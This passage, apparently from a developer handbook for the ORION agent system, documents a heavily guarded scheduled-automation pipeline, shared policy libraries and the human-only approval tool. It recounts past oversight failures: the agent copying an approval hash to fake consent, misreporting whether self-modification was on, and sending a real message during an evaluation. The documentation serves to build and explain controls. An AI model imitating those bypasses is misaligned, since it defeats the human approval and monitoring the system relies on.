dispatch     one-slot-per-minute state machine, retry policy, optional delivery (not enabled)
run          the single supported action: scripts/orion-agenda today (read-only)
history      history/<name>.jsonl row {at,name,status,reason,delivery}
forecast     simulate() + summarizeAutomationHistory + withHistory -> "observed" line
remove       orion-automation remove <name>: verify scheduler removal, move record back to proposed
```

#### Stage 1: proposal and the closed action table (`plugin/orion-control/src/automation.ts`)

A proposal is a JSON file (`AutomationProposal`, `automation.ts:120-145`): `name`, `intent`, `trigger`, `conditions {quietHours?, skipDuringFocus?}`, `action`, `permissions {expectsMode}`, `expiresOn` (ISO date, required), `riskLimits {maxRunsPerDay, maxMessagesPerDay}`, `failureBehavior` (`stop | retry_once | report_and_continue`), `proposedAt`, and `installedAt` (set only by a person: "Orion cannot write this field").

- **Trigger shapes, never a raw cron string** (`automation.ts:74-77`): `{kind:"daily", atHour, atMinute}`, `{kind:"hourly", atMinute}`, `{kind:"weekly", weekday 0-6, atHour, atMinute}`. `cronExpression(trigger)` (`automation.ts:256`) derives the cron text: daily `"<m> <h> * * *"`, hourly `"<m> * * * *"`, weekly `"<m> <h> * * <weekday>"`. The header explains: "a minute-field typo is a factor of sixty, and there is no reason a person should be typing one when the shape is already written down" (`orion-automation:32-35`).
- **The closed action table** `AUTOMATION_ACTIONS` (`automation.ts:88-116`): five entries, each a fixed argv, no free text:

| Action | argv | Risk |
|---|---|---|
| `standing_check` | `orion-standing check` | low |
| `standing_morning` | `orion-standing morning` | low |
| `standing_evening` | `orion-standing evening` | low |
| `agenda_today` | `orion-agenda today` | low |
| `daily_rollup` | `orion-daily` | medium |

  **Only `agenda_today` is supported by the runtime today**, enforced three times: `runInstalledAutomation` rejects any other action (`orion-automation-runtime.mjs:30`), `host.authorize` (`orion-automation-host.mjs:68-70`) requires `name === "agenda_today"` and argv exactly `["orion-agenda","today"]`, and `automationSchedulePlan` throws "Only agenda_today without outbound delivery is supported by this runtime" (`orion-automation-schedule.mjs:12-14`). The host comment (66-67): "An AUTO source diagnostic must never silently expand this supported set to routines that mutate."
- **Constants**: `NAME_RE = /^[a-z0-9][a-z0-9-]{1,47}$/` (`automation.ts:148`), `MAX_AUTOMATION_DAYS = 180` (151). `validateProposal` returns *all* problems at once ("a model that fixes one field per round trip takes seven turns to write one automation, and the seventh is where it starts inventing fields to make the errors stop", `automation.ts:~153-158`). `maxRunsPerDay` must be 1-1440.
- `automation.ts` is itself an AUTHORITY plugin file (`selfrepair.ts:312`): the table of what a scheduled job may do cannot be edited by the quiet repair path.

#### Stage 2: the human CLI `orion-automation` (`scripts/orion-automation`)

Arg parsing is positional (`const [command = "list", name, ...options] = process.argv.slice(2)`, line 91). It first loads the *installed* plugin via `loadPlugin()` from `lib/orion-plugin.mjs` (falling back to the repo build) and uses `describeTrigger`, `simulate`, `NAME_RE` from its `automation` module (65-70). Paths: `ROOT = ~/.openclaw/orion-controlled/automations`, `PROPOSED = ROOT/proposed`, `INSTALLED = ROOT/installed`, `OPENCLAW = ~/.openclaw/bin/openclaw` (58-63).

| Command | Behaviour | Source |
|---|---|---|
| (none) or `list` | prints "N proposed, waiting on you" with name, human trigger text, action and intent, then "N running" with `until <expiresOn>`; suggests `simulate` and `schedule-plan` for the first proposal. Exit 0 | 93-114 |
| `show <name>` | prints the raw JSON of `proposed/<name>.json`, else `installed/<name>.json`; exit 1 if neither | 121-126 |
| `simulate <name>` | `simulate(proposal)` (30-day default window from `automation.ts:296-298`), then reads `history/<name>.jsonl` over the same window, summarises it, merges via `withHistory`, prints fire/suppressed/message counts, an "Observed:" line if history exists, and notes. Read errors are treated as "no history" | 128-165 |
| `schedule-plan <name> --timezone <IANA>` | requires exactly `--timezone <value>` (`options.length !== 2 || options[0] !== "--timezone"` fails); checks the proposal's `name` equals its filename; prints the plan JSON from `automationSchedulePlan(proposal, tz, ~/Desktop/ORION)`. Writes nothing | 167-176 |
| `install <name>` | **always fails** with exit 1: "installation is unavailable until guarded scheduler registration is connected ... Nothing was scheduled." Reason (commit `8ef85c8` 2026-09-21): the legacy installer "used obsolete --schedule/--timezone flags, hardcoded New York time and ran through a delivery wrapper without the new admission/runtime checks" (`docs/planning/v2/PHASE_57_SCHEDULE_2026-09-21.md`) | 178-182 |
| `remove <name>` | requires `installed/<name>.json`; calls `removeAutomationSchedule`; on success moves the record back to `proposed/<name>.json` (deleting `installedAt` and `cron`, mode 0600) and unlinks the installed file. On *any* scheduler error it keeps the installed record: "an outage cannot masquerade as removal". Prints "schedule removed for '<name>'; the proposal is kept. An already-running task may still finish." | 184-205 |
| anything else | usage line, exit 2 | 207 |

Every command other than `list` needs a name matching `NAME_RE`, else `invalid automation name` (116-117). Exit codes: `fail(msg)` defaults to 2; "not found" and install/remove failures use 1.

**Stale header.** The top-of-file docstring (`orion-automation:30-35`) still says "What install actually does: Derives the cron expression ..." as if install worked; the command table at 37-42 correctly says "unavailable pending guarded registration". Code wins: install is disabled.

#### Stage 3: the schedule plan (`lib/orion-automation-schedule.mjs`)

`automationSchedulePlan(proposal, timeZone, repoRoot, now=Date.now())` (6-41) is a *pure preview*: "Does not install policy, initialize ledgers or create jobs."

1. Validate every field except expiry with `validateProposal` using a fake future `expiresOn` (the legacy validator uses host-local time; the real date is validated afterwards in the chosen zone, lines 7-10).
2. Require `action === "agenda_today"` and `delivery === undefined`.
3. Run `checkAutomationConditions` with a dummy context to validate the policy shape and the explicit IANA timezone ("An explicit IANA timezone and valid bounded policy are required"); the timezone must be `UTC` or in `Intl.supportedValuesOf("timeZone")` (admission lines 26-29).
4. Compute "today" in that zone and require the expiry to be within `[today, today+180 days]` in that zone (`Intl.DateTimeFormat("en-CA", {timeZone,...})`, lines 20-25). Opposite-date Los Angeles/Tokyo regression tests exist (`tests/automation-schedule.test.mjs`).
5. Return an object with `readyToInstall: false` and `nextGate: "Human installer must publish installation identity and durable ledgers, create disabled job, verify it, then enable it"`, plus the job name `orion-auto-<name>`, `cron`, `commandArgv: [<repo>/scripts/orion-automation-run, <name>]`, a copy of the policy, and:

```js
// scripts/lib/orion-automation-schedule.mjs:36-39
    schedulerArgs: ["cron", "add", "--name", `orion-auto-${proposal.name}`,
      "--cron", cron, "--tz", timeZone, "--command-argv", JSON.stringify(commandArgv),
      "--command-cwd", repoRoot, "--disabled", "--exact", "--no-deliver",
      "--timeout-seconds", "120", "--output-max-bytes", "4096", "--json"],
```

   "Native argv avoids shell quoting and never routes through an agent turn." Note this is **OpenClaw's own cron** (`openclaw cron add ...`), not launchd; there is no LaunchAgent for automations. The job is created `--disabled`, `--exact` (no stagger), `--no-deliver` (OpenClaw must not post output anywhere), with a 120 s timeout and a 4096-byte output cap.

#### Stage 4: installing (library only, `lib/orion-automation-install.mjs`)

`installDisabledAutomation({root, proposal, timeZone, repoRoot, scheduler, now})` (71-291) never enables a job. Every dependency is injected (the `scheduler` adapter exposes `createDisabled(plan) -> {id}`, `read(id) -> job|null`, `remove(id)`; `now` must be a safe-integer epoch-ms number). Steps:

1. Build the plan with `automationSchedulePlan`; mint `installationId = randomBytes(16).toString("hex")`; assemble the installed record with policy fields spread at the **top level** (`{name, installationId, installedAt, timeZone, trigger, ...plan.policy}`, lines 95-102).
2. Take an exclusive per-name lock by `mkdir(<root>/transactions/<name>.lock)` (non-recursive so EEXIST is meaningful), returning `already_installed`, `transaction_active` or `concurrent_refused` rather than overwriting (147-180).
3. **Persist the transaction intent before any scheduler effect** (`transactions/<name>.json`, `{version:1, name, phase, installationId, installedAt, timeZone, schedulerId, plan, record, evidence}`; temp file `wx` mode 0600, fsync, rename, fsync dir; 115-142, 195). Phases: `create_pending` then `job_known` then (`publication_failed` | `complete`).
4. `scheduler.createDisabled(plan)`; a bad return or a throw is `unknown_outcome` (the job may or may not exist). The id is persisted *before* the read-back (216-218).
5. `scheduler.read(id)` and `verifyDisabledSchedule(plan, observed)` (6-46): id non-empty; `name`, `timeZone`, `cron` equal; `commandArgv` identical element by element; `cwd` equals the value after `--command-cwd` in `schedulerArgs`; `enabled === false`, `exact === true`, `noDeliver === true`. Mismatch gives `verification_failed`, transaction stays `job_known`.
6. `initializeAutomationDispatch(<root>/runtime, record)` (creates admission and dispatch ledgers; see below), then publish `installed/<name>.json` via temp file plus `link()` (not `rename`, so an existing record is refused rather than overwritten), fsync (245-264). Failure gives `publication_failed`.
7. Mark `complete`, return `{status:"disabled_verified", name, installationId, schedulerId, enabled:false}`. Lock released in `finally` only if this call created it.

`reconcileDisabledAutomation({root, name, scheduler})` (307-511) is the recovery half and is "conservative: never creates or enables jobs, never resets consumed quotas, never guesses that a live lock owner is dead". Returns `busy`, `no_transaction`, `intervention_required` (reasons `missing_plan`, `read_failed`, `missing_job`, `mismatch`, `enabled`, `missing_installed_record`), `blocked_unknown_create` (a create with no recorded id is never retried or replaced), `complete_verified` (writes nothing so a second call gives identical bytes), `unknown_outcome`, `verified_absent`, `cleaned_up`, `cleanup_unknown`, `cleanup_failed`. For incomplete phases it removes the job only if the observed record is an exact disabled match, then reads again: only a `null` read proves removal. Each outcome appends to `evidence.reconcile[]`.

#### Stage 5: the schedule fires: `orion-automation-run` and the tick

`scripts/orion-automation-run` is six lines (`#!/usr/bin/env node`): `automationTick(process.argv.slice(2))`, print `JSON.stringify(summary)`, set `process.exitCode`. "Scheduler-only entry point. No policy creation, overrides or delivery." It accepts exactly one argument, the installed automation name: no timestamps, policy paths, timezone overrides or executable arguments.

`automationTick(args, {now, run})` (`orion-automation-tick.mjs:5-21`):
- Requires exactly one arg matching `^[a-z0-9][a-z0-9-]{1,47}$`; else `{status:"refused", reason:"invalid_arguments"}`, exit 2.
- Floors the clock to the minute: `Math.floor(at / 60000) * 60000`. "A scheduler wake-up is evaluated in its current minute. Missed slots are not reconstructed or caught up."
- Output is sanitised to a closed vocabulary: `status` must be one of `succeeded | refused | failed | outcome_unknown`; `reason` is kept only if it matches `^[a-z_]{1,80}$`. "Scheduler history must not contain calendar text, stderr or arbitrary adapter fields." Exit 0 only for `succeeded`, else 1; any exception becomes `{status:"refused", reason:"runtime_unavailable"}`.

#### Stage 6: the runtime (`orion-automation-runtime.mjs`)

`runInstalledAutomation(name, scheduledAt, {automationRoot, repoRoot, checks, run})` (19-91):
1. Name check; read `installed/<name>.json`. Must have `name` equal, `action === "agenda_today"`, no `delivery`, and a parseable `installedAt`; else `refused / installation_unavailable_or_unsupported` (26-35). It computes a **canonical** (sorted-key) JSON identity of the record and defines `unchanged()` which re-reads and compares; this is called repeatedly so a record edited mid-run aborts the run (36-39).
2. Builds three adapters for `dispatchAutomation`: `readContext` (calls the host check and remembers `admittedContext`), `authorize(action)` (`unchanged()` AND `checks.authorize(action) === true`), and `execute(action)`.
3. `execute` re-verifies everything *immediately before* the effect (the "recheck at the effect boundary" rule): action name, `installationId`, exact argv `["orion-agenda","today"]`, record unchanged, fresh context passes `checkAutomationConditions` and so did the admitted context on the same civil `day`, time did not go backwards, `context.now - scheduledAt <= 300000` (5 minutes), record still unchanged, and `checks.authorize(action)` once more "after that wait, not before it: a revoked allowlist/tier can leave mode unchanged" (49-63). Any failure here returns `{ok:false, retrySafe:true}`: "Only this no-launch branch may certify a failure as safe to retry."
4. It then runs the real action: `execFile(<repo>/scripts/orion-agenda, ["today"], {timeout:35000, killSignal:"SIGKILL", maxBuffer:1 MiB, env: {...process.env, TZ: record.timeZone}})`. Success returns `{ok:true, output: stdout.slice(0, 8192)}`; **any** exception returns `{ok:false}` with *no* `retrySafe`: "Exit failure, timeout and output overflow cannot establish what a launched process did. Never infer retry safety or expose stderr." (64-76).
5. After dispatch returns, unless `reason === "not_due"`, append a history row (`at: scheduledAt`, `name`, `status`, `reason`, `delivery` status) to `history/<name>.jsonl`; a recording failure "must not change the result" (79-89).

#### Stage 7: host checks (`orion-automation-host.mjs`)

`createAutomationHostChecks({repoRoot, homeRoot, run, read, now})` returns a frozen object with two methods. It "grants no installation authority and provides neither execution nor delivery".
- `authority()` runs `scripts/orion-authority show --json` and rejects unless: `dist` equals the installed plugin dist, `mode` is a known mode (`contained|guarded|open|sovereign`), `profileSource === "permission-state.json"`, `modeSource` does not contain `override`, capabilities and availability are arrays, and the exec policy is exactly `security:"allowlist", ask:"off", askFallback:"deny"` (35-45).
- `readContext()` returns `{now, effectiveMode, focusActive}`. Focus is read from two places: the native app via `orion-session status --json` (`running/paused/waiting-for-return/finishing` count as active; `none/not-started/finished` as inactive; anything else unknown) and the legacy `~/.openclaw/orion-controlled/focus.json` (`session:null` is inactive; otherwise `now <= session.until`). If either says active, `true`; if both say inactive, `false`; otherwise `null` (unknown). The session probe is forced onto this host's socket by overriding `ORION_SESSION_SOCKET` to `~/.openclaw/orion-session.sock` (27-34, 46-64).
- `authorize(action)` is true only if the action is exactly `agenda_today` with argv `["orion-agenda","today"]` and a non-empty `installationId`, AND the authority map shows exactly one `automation` tier that is `available`, not `unresolved`, with both `configOn` and `profileOn`, AND exactly one `orion-agenda` command row whose pattern equals `<scripts>/orion-agenda`, level `AUTO`, no `escapeHatch`, and no subcommands (65-82).

#### Stage 8: admission (`orion-automation-admission.mjs`)

Two jobs: check *conditions*, and reserve a *durable quota*.

`binding(record, budget)` (14-41) validates the policy and builds `{policy, limit, hash}`; `hash = sha256(JSON.stringify(policy))` where `policy = {name, installationId, timeZone, expiresOn, maxRunsPerDay, expectsMode, quietHours (or null), skipDuringFocus}` (plus `maxMessagesPerDay` for the `messages` budget). Required: name matches the regex, `installationId` matches `^[a-zA-Z0-9-]{8,80}$`, valid `YYYY-MM-DD` expiry, `maxRunsPerDay` integer 1-1440, a known mode, a `conditions` object, optional `quietHours` as two integers 0-23.

`checkConditions(policy, context)` (93-115) returns the first failing reason, in this order:
1. `invalid_clock` (non-safe-integer or negative `now`);
2. `mode_mismatch` if `context.effectiveMode !== policy.expectsMode` (equality "records expectations; it is never an authority grant for the action itself");
3. `expired` if the local day in the policy time zone is after `expiresOn` (strict string compare of `YYYY-MM-DD`; expiry day itself still runs);
4. `quiet_hours`: window `[start, end)`; if `start < end` simple range, if `start > end` wraps midnight (22 to 8 works), if equal never quiet (103-110);
5. `focus_active` / `focus_unknown` if `skipDuringFocus` and `focusActive !== false`: **unknown focus fails closed**.

`reserveCheckedBudget` (117-153) implements the durable quota, for `runs` and (separate ledger) `messages`:
- State file `<root>/<sha256(installationId)>.json` (for messages: `sha256("messages:"+id)`), shape `{version:1, binding, day, runs, lastAt}`; lock is an `mkdir` directory `<hash>.lock` (`EEXIST` returns `busy`).
- Checks: version 1; `binding` equals the policy hash (a *changed policy* invalidates the old ledger, `invalid_state`); runs within 0-1440 (48 for messages); `day:null` iff `runs:0` and `lastAt:0`; the recorded `lastAt` falls on the recorded `day` in the policy time zone.
- `clock_regressed` if `now < state.lastAt` or `day < state.day`. `runs` resets to 0 when the local day changes. `runs >= limit` returns `daily_limit` (or `daily_message_limit`).
- Otherwise write a temp file, rename over the state, fsync the directory, and return `{admitted:true, day, runNumber}`. **No refunds**: "failure or process death after this point still consumes an attempt. A failed durable write never returns admission" (142-145).
- A crash leaves the lock directory behind: "Never guess that another process's lock is stale. A crash leaves a visible refusal until an operator establishes it is safe to recover" (149-151).
- `initializeBudget` (64-70) creates the ledger with `wx` (fail if exists). "Only the human installation path may initialize. Runtime never recreates a missing file: doing so would turn deletion or storage loss into a quota reset."

#### Stage 9: dispatch (`orion-automation-dispatch.mjs`): the state machine

`dispatchAutomation(root, record, scheduledAt, adapters)` (59-174):

1. `installation(record)` (14-27): canonicalise, require a known action key, `failureBehavior` in `stop|retry_once|report_and_continue`, a valid trigger (hourly needs only `atMinute`; daily/weekly need `atHour`; weekly needs `weekday`), and a delivery block only if `targetId` matches `^[a-zA-Z0-9][a-zA-Z0-9_.:-]{0,127}$` and `maxMessagesPerDay` is 0-48. `binding = sha256(canonical(record))`, `key = sha256(installationId)`.
2. `scheduledSlot(record, at)` (28-38): `at` must be minute-aligned; formats `at` in the record's timezone and requires minute (and hour, and weekday for weekly) to equal the trigger. Returns a civil label `YYYY-MM-DDTHH:MM`, or null. A null slot returns `{status:"refused", reason:"not_due"}`. This is how a cron job that fires "every minute" can safely be pointed at an automation: every call self-checks whether this minute is actually the trigger minute.
3. Acquire `<root>/<key>.dispatch.json.lock` (an `mkdir`). Failure is `busy_or_unavailable`.
4. Load the dispatch state `{version, binding, phase, lastAt, lastSlot, lastDelivery?}`. Reject if the binding differs (the installed record changed) or the shape is wrong (`invalid_state`). Phases: `ready | pending | stopped | action_completed | delivery_pending | delivery_unknown`. Anything but `ready` refuses (a `pending` state reports as `outcome_unknown`, others as the phase name).
5. `scheduledAt <= state.lastAt || slot <= state.lastSlot` returns `duplicate_or_old_trigger`. Comparing the **civil slot** string "also suppresses the repeated hour at DST fall-back" (81-84).
6. For each attempt (`retry_once` gives 2, otherwise 1): re-read the context (`stale_or_future_trigger` if `now < scheduledAt` or more than 300000 ms late), re-authorize (`not_authorized`), `reserveAutomationRun` (admission reasons propagate), persist `phase:"pending"` with `lastAt`/`lastSlot`, then call `adapters.execute(action)`. Every attempt re-authorizes "including a retry".
7. Interpreting the result (113-165): a result that is not `{ok: boolean}`, or `ok:false` without `retrySafe:true`, sets phase `stopped` and returns `{status:"outcome_unknown"}`. `ok:true` sets `action_completed` and handles optional delivery (never enabled for `agenda_today`; the schedule plan and runtime reject `delivery`). `ok:false, retrySafe:true` sets the phase by `failureBehavior`: `report_and_continue` returns to `ready`; otherwise `pending` between attempts and `stopped` after the last. Delivery code (124-159) withholds with a reason (`daily_message_limit`, `delivery_adapter_unavailable`, `delivery_not_authorized`, `empty_output`, or an admission reason) and never retries an uncertain send: phase becomes `delivery_unknown`, which blocks future runs.
8. A thrown error after the action completed returns `succeeded` with a `delivery` note; otherwise `outcome_unknown` or `refused / state_or_adapter_unavailable`. The lock directory is removed in `finally`.

The ordering invariants are the heart of the file: reserve the quota *before* writing `pending`; write `pending` *before* executing; never infer retry safety from an exit code; persist the new phase *before* returning. Each of those is a place where a crash must leave a conservative record. Consequences: a crash mid-run leaves the automation `stopped`/`pending` until a human looks, and quota already spent stays spent.

`initializeAutomationDispatch(root, record)` (50-57) creates `admission/` and (if delivery) `messages/` ledgers under `root` and the dispatch file `{version:1, binding, phase:"ready", lastAt:null, lastSlot:null}` (written with `wx`).

#### Stage 10: history, summary and forecast

- **History ledger** (`orion-automation-history.mjs`): one JSON line per dispatch outcome, file `automations/history/<name>.jsonl`. Row shape is exactly `{v:1, at, name, status, reason, delivery, recordedAt}` (`isHistoryEntry` rejects any extra or missing key, 17-30). `status` is one of `succeeded|failed|refused|outcome_unknown`; `reason` is `null` or matches `^[a-z_]{1,64}$`; `delivery` is `null` or one of `not_requested|withheld|delivered|not_delivered|unknown|not_attempted`. `appendAutomationHistory` validates a five-key input and adds `recordedAt` (44-60; dir mode 0700, file mode 0600). `readAutomationHistory(file, {since, until})` returns `{entries, skipped}`: missing file is empty, lines over 4096 chars, unparsable lines and invalid shapes are counted as skipped, entries are filtered to `[since, until)` and sorted by `at` (62-97).
- **Summary** (`orion-automation-history-summary.mjs`, pure): for entries inside `[from - windowDays*86400000, from)` counts `firings` (status succeeded, failed or outcome_unknown), `suppressed` (status refused with a reason in `quiet_hours, focus_active, focus_unknown, mode_mismatch, expired, daily_limit`), `refused` (any other refusal), `succeeded/failed/unknown`, `delivered`, `withheld`, `byReason`, and a `perDay` map keyed by UTC date; `observedDays = perDay.size`. `windowDays` must be an integer 1-366.
- **Forecast merge** (`orion-automation-history-forecast.mjs`, pure): `withHistory(forecast, summary)` returns a *new* forecast. With no summary or zero observed days it appends `NO_HISTORY_NOTE`: "No history has been recorded for this automation yet, so the numbers above are the ceiling only." Otherwise it adds an `observed` object, replaces the "focus not modelled" note with "Focus sessions suppressed N firing(s) in the observed days.", and appends "Observed on X of the last Y day(s): fired A, suppressed B, delivered C."
- **Simulate itself** (`automation.ts:294-359`) is arithmetic against the calendar, not a dry run ("a dry run of `orion-daily` would roll up the day's memory, which is the thing simulation exists to avoid doing"). It counts every trigger firing in the window (hourly: 24 per day; weekly: only the matching weekday), subtracts quiet-hour firings as suppressed, caps messages per day by `riskLimits.maxMessagesPerDay`, and always notes that it reports a **ceiling**: "`<action>` stays silent when it has nothing to say."

#### Stage 11: removal (`orion-automation-removal.mjs`)

`removeAutomationSchedule(run, binary, name)` (3-30) is the "a successful command is not proof that a schedule stopped" rule. It requires a *complete* scheduler reading before and after: `openclaw cron list --all --json` must return `{jobs:[...], hasMore:false, offset:0, total === jobs.length}` with unique ids, string names; else it throws. Exactly one job named `orion-auto-<name>` is removed with `openclaw cron remove <id> --json`; zero matches returns `{alreadyAbsent:true}`; more than one throws ("multiple schedules match; local installation retained"). A second full listing must no longer contain the id or name.

- **Contracts (data files, all under `~/.openclaw/orion-controlled/automations/`)**:

| Path | Created by | Contents |
|---|---|---|
| `proposed/<name>.json` | plugin `automation_propose`; also written back by `remove` | the proposal |
| `installed/<name>.json` | installer (future) | proposal fields spread at top level plus `installationId`, `installedAt`, `timeZone`, `trigger`, `cron` removed on remove |
| `transactions/<name>.json`, `<name>.lock/` | `installDisabledAutomation` | durable install transaction; lock directory |
| `runtime/admission/<sha256(id)>.json` + `.lock/` | `initializeAutomationAdmission` | `{version, binding, day, runs, lastAt}` run quota |
| `runtime/messages/<sha256("messages:"+id)>.json` | `initializeAutomationMessages` (only if `delivery`) | message quota |
| `runtime/<sha256(id)>.dispatch.json` + `.lock/` | `initializeAutomationDispatch` | `{version, binding, phase, lastAt, lastSlot, lastDelivery?}` |
| `history/<name>.jsonl` | runtime after each non-`not_due` dispatch | history rows |

  **Gates** (summary): closed action table; only `agenda_today`; no `delivery`; installed record must exist and be unchanged; effective mode equals `expectsMode`; expiry (max 180 days); quiet hours; focus (unknown fails closed); daily run cap (1-1440) durable and non-refundable; trigger minute check; 5-minute lateness limit; authority recheck (`orion-authority show --json`: exec policy must be allowlist/off/deny, automation tier available, `orion-agenda` row `AUTO` with no escape hatch); 35 s timeout; 8192 byte output cap; unknown outcomes stop the automation.
  **Env vars**: `ORION_SESSION_SOCKET` is deliberately overridden inside the host checks. Otherwise none; `HOME` determines roots through `homedir()`.
- **Calls out to** — `~/.openclaw/bin/openclaw cron list --all --json` / `cron remove <id> --json` (and, by the plan only, `cron add ...`); `scripts/orion-authority show --json`; `scripts/orion-session status --json`; `scripts/orion-agenda today`; `plugin/orion-control/dist/automation.js` (via `loadPlugin()` or direct import in `orion-automation-schedule.mjs:3` and `orion-automation-dispatch.mjs:6`).
- **History** (`git log`): `caf2333` 2026-09-03 "phases 51-60" (CLI created, automation as a proposal); `eda7551` 2026-09-18 durable expiry and daily-run admission guard; `bc0bb47` 2026-09-18 verify scheduler removal before clearing installed state; `ef41ab5` 2026-09-19 durable admission connected to guarded dispatch; `3c657b8` 2026-09-19 durable notification budgets; `04cbc1a` 2026-09-20 bind execution to installed policy; `7354e07` 2026-09-20 read live host authority and focus context; `8ef85c8` 2026-09-21 guarded scheduler entry point and preview (and the install disable); `97cec31`/`d7286b2`/`7898699`/`6b696c5`/`004b7a6` 2026-09-24/25 the install transaction, readback and reconcile (these arrive as `agent(auto-install-*)` commits, i.e. local-model-authored then reviewer-repaired); `cb26fea`, `d8115bc`, `3407596`, `e347f55` 2026-09-26 history ledger, summary, forecast, runtime recording.
- **Gotchas & lessons**
  - *Absence was the original enforcement.* Before Phase 57 became structural, "nothing in ACTION_CATALOG could write a LaunchAgent or a crontab, and `openclaw` is not on the exec allowlist. Absence is strong enforcement and it is also brittle" (`orion-automation:12-15`). So installing is a separate human-run file, absent from `exec-approvals.json`, in `FORBIDDEN_SCRIPTS`, and the only writer of `installed/`.
  - *The scheduler is OpenClaw cron, not launchd.* The only launchd labels in this chapter are `com.nickmadaio.orion.repairwatch` (repair watcher), `com.nickmadaio.orion.tts`, `com.nickmadaio.orion.voiceid`.
  - *Failure is a state.* A crash or unknown outcome leaves a visible lock or `stopped`/`pending` phase that a human must clear; there is no automatic recovery, by design.
  - *Everything the scheduler sees is sanitised.* No stderr, no calendar text.
  - *Install is disabled.* A person reading `orion-automation install` will hit the refusal; do not assume the transaction library is in use.
  - *Expiry semantics:* the install check is "today through 180 days ahead in the chosen zone"; the runtime refuses once the local day is after `expiresOn`.
- **Walk it yourself** (read-only): `./scripts/orion-automation` (lists proposals, currently none); `sed -n 59,174p scripts/lib/orion-automation-dispatch.mjs` and trace the phases; `sed -n 93,115p scripts/lib/orion-automation-admission.mjs` for the condition order; `node scripts/orion-automation-run bad` is safe (it refuses with `invalid_arguments`... but note it would be a real run if given a real installed name, so only try the bad-name form); run the tests with `node --test tests/automation-dispatch.test.mjs tests/automation-admission.test.mjs tests/automation-runtime.test.mjs tests/automation-install.test.mjs` (these use sandbox roots; check each file's header before running).
- **Questions to ask your tutor** — (1) Why is a cron expression never accepted as input? (2) Walk through every file that changes when a single automation fires once successfully. (3) Why does dispatch persist `pending` before executing, and what does a leftover `pending` mean? (4) Why can only the no-launch branch return `retrySafe:true`? (5) Why does a deleted admission ledger *refuse* instead of being recreated? (6) How does `scheduledSlot` let one every-minute cron job serve a daily 07:30 automation, and what does it do at DST fall-back? (7) Why does `remove` demand a complete second scheduler listing? (8) Why did the team choose OpenClaw cron `--command-argv` over launchd or a shell wrapper?


---

### 10.5 Shared libs: `orion-plugin.mjs`, `orion-selfdev-policy.mjs`, `thinking-policy.mjs`, `eval-mode.mjs`, `orion-inference-summary.mjs`

Short form. These five files (all under `scripts/lib/`) are imported by many scripts in this chapter.

| File (lines) | What it does | Key lines | Who uses it |
|---|---|---|---|
| `orion-plugin.mjs` (282) | "The one place that answers which capability tiers are actually on." Every fact is read back from the **installed** compiled plugin, never copied, because `orion-selfdoc` once hand-copied the table, dropped `self_modification`, `self_tuning`, `health_tracking`, and ORION told Nick self-modification was disabled while it was on (header `:1-19`). Exports `PATHS` (installed dist `~/.openclaw/extensions/orion-control/dist`, built dist, `openclaw.json`, `exec-approvals.json`, `permission-state.json`, the gate dir), `loadPlugin()` (imports `catalog.js`, `permissions.js`, `approvals.js`, `strictness.js`, `automation.js`, `explain.js` and reads `index.js`; tries installed first, then repo build), `deployDrift()` (true if the two `catalog.js` files differ), `resolveFlag`, `tierAvailability`, `readOrionConfig`, `readProfile`, `collectCommands`, `allowlistedWrapperNames` | `:28`, `:60-82`, `:84-90`, `:102`, `:120`, `:276` | `orion-approve`, `orion-authority`, `orion-selfdoc`, `orion-repair`, automation scripts |
| `orion-selfdev-policy.mjs` (73) | Lets the Python `orion-code` ask the plugin's own `self-development-authority.js` whether a path may be edited. It states no policy itself. **Installed copy first, repo build second**: checking an edit to the policy tables against the build it is about to change "is how it would authorise itself" (`:9-15`). Subcommands `surfaces` (prints `GOVERNED_SELF_DEVELOPMENT_ENABLED` and `FORBIDDEN_SELF_CHANGE_SURFACES`) and `check <path>...` (exit 0 allowed, 1 refused naming file and surface, 2 usage) | `:25-33`, `:36-48`, `:50-66` | `orion-code` (ch. 09) |
| `thinking-policy.mjs` (26) | When ORION thinks (2026-10-07): `needsReasoning(text)` is true for a narrative plan, a whole-day request, two or more action verbs, one verb plus an anchor word, or 35+ words; `thinkingLevel(text, {model})` returns `"off"` for any `ollama/` model ("Local models never think") else `"low"` or `"off"`. Same rule as the Swift `MobileCore/ThinkingPolicy.swift` (header) | `:13-21`, `:23-26` | tests: `tests/thinking-policy.test.mjs`; `26baa71` 2026-10-08 |
| `eval-mode.mjs` (21) | A marker file `~/.openclaw/orion-controlled/eval-mode` (override `ORION_EVAL_MARKER`) younger than 2 hours means an evaluation is running. `refuseDuringEval(what)` prints "Not sent: ... ORION is in an evaluation run" and exits 0. Born when a scenario asking "do I need an umbrella?" made ORION run `orion-weather-alert` and a real Discord message went out (2026-09-30) | `:10`, `:12-15`, `:17-21` | `orion-messages-send:39,46`, `orion-discord-alert:18`, `orion-reach:36` (see 4.10) |
| `orion-inference-summary.mjs` (174) | Pure summary of the inference ledger: `parseJsonl(text)` returns `{rows, skipped}` and counts bad lines; `summarizeInference(rows, {from, to})` returns totals, per-model and per-day call counts and cost, and skipped | `:9-27`, `:32` | `orion-costs` (9.5) |

**Gotcha (shared).** `orion-plugin.mjs` is why a script like `orion-approve` fails with "no built plugin found" when neither dist directory has been built: it imports the compiled JS, not the TypeScript.

---

### 10.6 `orion-approve` and `orion-approve-resume`

#### `orion-approve`
- **What it is** — The one act ORION cannot perform: Nick saying yes. Before 2026-09-02 an `approvalRequired` action returned a canonical hash that the model copied into a second call, so the transcript "looked exactly like a real approval ... and no person was consulted at any point" (`scripts/orion-approve:7-11`). The fix is not a better hash but a program ORION is not allowed to run.
- **Where** — `scripts/orion-approve` (149 lines): header 2-46; plugin load 48-55; flag parsing 57-60; `who` 66; `list()` 71-90; `revoke-chat` 94-103; `deny` 105-117; one-at-a-time rule 119-124; grant 126-135; resume spawn 136-146; closing message 147-149.
- **How it works**
  1. `loadPlugin()` from `lib/orion-plugin.mjs`; pulls `approvals.{approvalPaths, grant, grantForChat, deny, readTickets, normalizeTicketId, revokeChatGrants}` (`:54`). The gate directory is `PATHS.gateApprovals` (`~/.openclaw/orion-gate/approvals`, `tickets/` and `grants/` inside).
  2. No arguments: list waiting tickets with id, summary, what was asked for, minutes left; exit 0 if any, 1 if none (`:71-92`). `--json` prints the ticket array.
  3. `orion-approve A-7F3K` (id case-insensitive, `A-` optional via `normalizeTicketId`) calls `grant(gate, id, who)` (`:130`). `who` is `<USER>@terminal`, or `<USER>@app` when the Mac app runs the same tool with `ORION_APPROVE_VIA=app` (`:66`); `grant()` refuses the names "local" and "orion", because "local" is what an exec call from ORION himself would present.
